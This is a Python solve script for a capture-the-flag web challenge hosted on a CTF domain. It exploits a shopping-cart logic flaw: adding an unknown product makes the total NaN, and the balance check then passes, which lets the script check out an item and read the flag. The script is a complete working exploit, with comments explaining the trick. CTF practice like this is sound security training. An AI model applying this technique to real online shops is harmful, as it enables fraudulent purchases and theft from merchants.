import requests

BASE_URL = "https://zazastore.ctf.pascalctf.it"

s = requests.Session()

# Login
r = s.post(f"{BASE_URL}/login", data={"username": "test", "password": "test"})
print("Login:", r.json())

# Add a fake product to make total = NaN
# prices["nonexistent"] is undefined, undefined * quantity = NaN
# NaN > balance is false, so checkout will succeed
r = s.post(f"{BASE_URL}/add-cart", json={"product": "nonexistent", "quantity": 1})
print("Add fake product:", r.json())

# Now add RealZa to cart
r = s.post(f"{BASE_URL}/add-cart", json={"product": "RealZa", "quantity": 1})
print("Add RealZa:", r.json())

# Checkout - total will be NaN, and NaN > 100 is false
r = s.post(f"{BASE_URL}/checkout")
print("Checkout:", r.json())

# Get inventory to see the flag
r = s.get(f"{BASE_URL}/inventory")
print("\n--- Inventory page ---")
print(r.text)
